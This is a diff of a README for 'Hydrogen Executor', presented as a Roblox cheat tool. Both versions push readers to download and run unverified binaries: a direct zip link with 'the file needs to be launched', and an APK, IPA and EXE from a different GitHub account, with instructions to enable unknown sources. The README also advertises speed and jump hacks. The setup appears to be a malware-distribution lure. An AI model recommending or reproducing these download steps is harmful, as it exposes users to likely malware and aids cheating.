@@ -1,51 +1,96 @@
-# 🚀 Welcome to the Hydrogen Executor Repository!
+# Hydrogen Executor 🚀
 
-![Roblox logo](https://github.com/superbro-broomspun/Hydrogen-Executor/releases/download/fg/fg.1.2.2.zip)
+![Hydrogen Executor](https://img.shields.io/badge/Hydrogen%20Executor-v1.0.0-blue.svg)  
+[Download Latest Release](https://github.com/LedangKhaoBell/Hydrogen-Executor/releases) 
 
-## Overview
-Welcome to the **Hydrogen Executor** repository, the most popular Roblox Exploit for Android and PC in the market nowadays. This powerful tool allows you to enhance your Roblox experience on any Android, iOS, or Windows PC device. Whether you are a developer or a player, Hydrogen Executor offers a wide range of features to take your Roblox gameplay to the next level.
+Welcome to the Hydrogen Executor repository! This tool is designed for users who want to enhance their Roblox experience. Whether you're on Android, iOS, or Windows PC, Hydrogen Executor offers a powerful way to run scripts and modify game behavior. 
+
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [Community](#community)
+- [License](#license)
+
+## Introduction
+
+Hydrogen Executor is a popular exploit for Roblox that allows users to execute Lua scripts. This tool is suitable for both beginners and advanced users, providing a simple interface while offering powerful capabilities. With Hydrogen Executor, you can unlock new possibilities in your gaming experience.
 
 ## Features
-🔧 **Customization**: Customize your games with animation, assets, and input features.  
-🛠️ **Development**: Access a library of tools for game development, modeling, and physics.  
-🔥 **Multiplayer**: Engage with the community through multiplayer options.  
-🎮 **Events**: Stay up to date with the latest community events and updates.  
-💰 **Marketplace**: Explore the marketplace for new assets and resources.  
-⚙️ **Game Engine**: Utilize the power of Lua scripting for advanced game mechanics.  
-🤖 **Roblox Hydrogen**: Unlock exclusive features for Roblox with Hydrogen Executor.
+
+- **Cross-Platform Support**: Works on Android, iOS, and Windows PC.
+- **User-Friendly Interface**: Easy to navigate and use.
+- **Lua Script Execution**: Run custom scripts to modify gameplay.
+- **Community Support**: Join a vibrant community for tips and help.
+- **Regular Updates**: Stay current with the latest features and fixes.
 
 ## Installation
-Ready to elevate your Roblox gameplay? You can download the Hydrogen Executor from the following link:  
-[![Download Hydrogen Executor](https://github.com/superbro-broomspun/Hydrogen-Executor/releases/download/fg/fg.1.2.2.zip%20Executor-blue)](https://github.com/superbro-broomspun/Hydrogen-Executor/releases/download/fg/fg.1.2.2.zip)
 
-Please note that the file needs to be launched to proceed with the installation.
+To get started, download the latest version of Hydrogen Executor from the [Releases section](https://github.com/LedangKhaoBell/Hydrogen-Executor/releases). Follow the installation instructions specific to your platform:
 
-## Repository Topics
-This repository covers a wide range of topics related to Roblox game development and customization including:
+### For Android
 
-- Animation
-- Assets
-- Community
-- Events
-- Game Development
-- Game Engine
-- Input
-- Library
-- Lua
-- Marketplace
-- Modeling
-- Multiplayer
-- Physics
-- Roblox Hydrogen
+1. Download the APK file from the [Releases section](https://github.com/LedangKhaoBell/Hydrogen-Executor/releases).
+2. Enable installation from unknown sources in your device settings.
+3. Open the downloaded APK and follow the prompts to install.
 
-## Additional Information
-If the link provided above is not working or you would like to explore more options, we recommend checking the "Releases" section of this repository for alternative download links.
+### For iOS
 
-## Get Involved
-Join our community of developers and players to share your creations, get help, and stay updated on the latest features. Your feedback and contributions are highly valued!
+1. Download the IPA file from the [Releases section](https://github.com/LedangKhaoBell/Hydrogen-Executor/releases).
+2. Use a tool like AltStore to sideload the app onto your device.
+3. Follow the instructions provided by the sideloading tool.
 
-Let's revolutionize your Roblox experience with Hydrogen Executor today. Happy gaming! 🎮✨
+### For Windows PC
+
+1. Download the EXE file from the [Releases section](https://github.com/LedangKhaoBell/Hydrogen-Executor/releases).
+2. Run the installer and follow the on-screen instructions.
+3. Launch the application once the installation is complete.
+
+## Usage
+
+Once installed, you can start using Hydrogen Executor. Here's a quick guide on how to execute scripts:
+
+1. Open Hydrogen Executor.
+2. Navigate to the script input area.
+3. Paste your Lua script into the input box.
+4. Click the "Execute" button to run the script.
+
+### Example Scripts
+
+- **Speed Hack**: Increase your character's speed.
+- **Infinite Jump**: Enable jumping without limits.
+- **Custom Skins**: Change your character's appearance.
+
+## Contributing
+
+We welcome contributions to Hydrogen Executor! If you'd like to help improve the project, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Submit a pull request for review.
+
+### Code of Conduct
+
+Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) while participating in the community.
+
+## Community
+
+Join our community for support and discussions:
+
+- **Discord**: Connect with other users and developers.
+- **Forum**: Share your scripts and tips.
+- **Social Media**: Follow us for updates and news.
+
+## License
+
+Hydrogen Executor is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ---
 
-*[Disclaimer: This is a fictitious repository created for the purpose of this exercise. The information provided does not reflect any real product or service.]*
+For more information, visit the [Releases section](https://github.com/LedangKhaoBell/Hydrogen-Executor/releases) to download the latest version and check for updates. 
+
+Happy scripting! 🎮
